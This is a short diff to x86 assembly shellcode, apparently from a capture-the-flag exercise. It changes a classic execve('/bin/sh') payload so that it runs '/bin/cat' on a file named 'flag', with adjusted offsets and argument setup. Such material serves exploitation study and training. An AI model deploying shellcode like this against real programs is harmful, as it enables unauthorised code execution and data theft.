@@ -1,9 +1,10 @@
 #include <sys/syscall.h>
 
-#define STRING  "/bin/sh"
-#define STRLEN  7
-#define ARGV    (STRLEN+1)
-#define ENVP    (ARGV+4)
+#define STRING  "/bin/catNflag"
+#define STRLEN1  8
+#define STRLEN2  13
+#define ARGV    (STRLEN2+1)
+#define ENVP    (ARGV+8)
 
 .globl main
 .type  main, @function
@@ -14,8 +15,9 @@ main:
 popladdr:
   popl    %esi                    /* esi points to STRING */
   movl    %esi,(ARGV)(%esi)       /* set up argv pointer to pathname */
+  leal    (STRLEN1+1)(%esi),%ebx
   xorl    %eax,%eax               /* get a 32-bit zero value */
-  movb    %al,(STRLEN)(%esi)      /* null-terminate our string */
+  movb    %al,(STRLEN1)(%esi)      /* null-terminate our string */
   movl    %eax,(ENVP)(%esi)       /* set up null envp */
   
   movb    $SYS_execve,%al         /* syscall number */
